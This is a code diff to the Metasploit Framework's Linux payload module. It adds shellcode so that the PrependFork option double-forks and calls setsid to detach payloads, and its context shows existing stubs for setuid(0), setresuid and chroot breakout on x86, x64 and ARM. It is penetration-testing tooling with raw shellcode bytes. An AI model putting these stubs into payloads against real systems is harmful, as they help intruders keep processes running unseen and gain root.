@@ -21,7 +21,7 @@ module Msf::Payload::Linux
         Msf::OptBool.new('PrependFork',
           [
             false,
-            "Prepend a stub that executes: if (fork()) { exit(0); }",
+            "Prepend a stub that starts the payload in its own process via fork",
             "false"
           ]
         ),
@@ -116,10 +116,20 @@ module Msf::Payload::Linux
                "\x58"                 + #   popl    %eax                       #
                "\xcd\x80"             + #   int     $0x80       ; fork         #
                "\x85\xc0"             + #   test    %eax,%eax                  #
-               "\x74\x06"             + #   jz      0xf                        #
+               "\x74\x06"             + #   jz      loc_000f                   #
+                                        # loc_0009:
                "\x31\xc0"             + #   xor     %eax,%eax                  #
-               "\xb0\x01"             + #   movb    $0x1,%al    ; exit         #
-               "\xcd\x80"               #   int     $0x80                      #
+               "\xb0\x01"             + #   movb    $0x1,%al                   #
+               "\xcd\x80"             + #   int     $0x80       ; exit         #
+                                        # loc_000f:
+               "\xb0\x42"             + #   movb    %0x42,%al                  #
+               "\xcd\x80"             + #   int     $0x80       ; setsid       #
+
+               "\x6a\x02"             + #   pushb   $0x2                       #
+               "\x58"                 + #   popl    %eax                       #
+               "\xcd\x80"             + #   int     $0x80       ; fork         #
+               "\x85\xc0"             + #   test    %eax,%eax                  #
+               "\x75\xed"               #   jnz     loc_0009                   #
       end
 
       if (datastore['PrependSetresuid'])
@@ -173,6 +183,7 @@ module Msf::Payload::Linux
                "\x58"                 + #   popl    %eax                       #
                "\xcd\x80"               #   int     $0x80                      #
       end
+
       if (datastore['PrependChrootBreak'])
         # setreuid(0, 0)
         pre << "\x31\xc9"             + #   xorl    %ecx,%ecx                  #
@@ -210,7 +221,6 @@ module Msf::Payload::Linux
              "\x89\xd9"             + #   movl   %ebx,%ecx                   #
              "\x58"                 + #   popl   %eax                        #
              "\xcd\x80"               #   int     $0x80                      #
-
       end
 
       # Append exit(0)
@@ -304,16 +314,25 @@ module Msf::Payload::Linux
     elsif (test_arch.include?(ARCH_X64))
 
       if (datastore['PrependFork'])
-        # if (fork()) { exit(0); }
+        # if (fork()) { exit(0); }; setsid(); if (fork()) { exit(0); };
         pre << "\x6a\x39"             #    push    57        ; __NR_fork     #
         pre << "\x58"                 #    pop     rax                       #
         pre << "\x0f\x05"             #    syscall                           #
         pre << "\x48\x85\xc0"         #    test    rax,rax                   #
-        pre << "\x74\x08"             #    jz      0x08                      #
+        pre << "\x74\x08"             #    jz      loc_0012                  #
+        #                             #  loc_000a:                           #
         pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         pre << "\x6a\x3c"             #    push    60        ; __NR_exit     #
         pre << "\x58"                 #    pop     rax                       #
         pre << "\x0f\x05"             #    syscall                           #
+        #                             #  loc_0012:                           #
+        pre << "\x04\x70"             #    add     al, 112   ; __NR_setsid   #
+        pre << "\x0f\x05"             #    syscall                           #
+        pre << "\x6a\x39"             #    push    57        ; __NR_fork     #
+        pre << "\x58"                 #    pop     rax                       #
+        pre << "\x0f\x05"             #    syscall                           #
+        pre << "\x48\x85\xc0"         #    test    rax,rax                   #
+        pre << "\x75\xea"             #    jnz     loc_000a                  #
       end
 
       if (datastore['PrependSetresuid'])
@@ -422,19 +441,23 @@ module Msf::Payload::Linux
       end
 
       # Append exit(0)
+
       if (datastore['AppendExit'])
         app << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         app << "\x6a\x3c"             #    push    0x3c                      #
         app << "\x58"                 #    pop     rax                       #
         app << "\x0f\x05"             #    syscall                           #
       end
+
     elsif (test_arch.include?(ARCH_ARMLE))
+
       if (datastore['PrependSetuid'])
         # setuid(0)
         pre << "\x00\x00\x20\xe0"     #    eor r0, r0, r0                    #
         pre << "\x17\x70\xa0\xe3"     #    mov r7, #23                       #
         pre << "\x00\x00\x00\xef"     #    svc                               #
       end
+
       if (datastore['PrependSetresuid'])
         # setresuid(ruid=0, euid=0, suid=0)
         pre << "\x00\x00\x20\xe0"     #    eor r0, r0, r0                    #
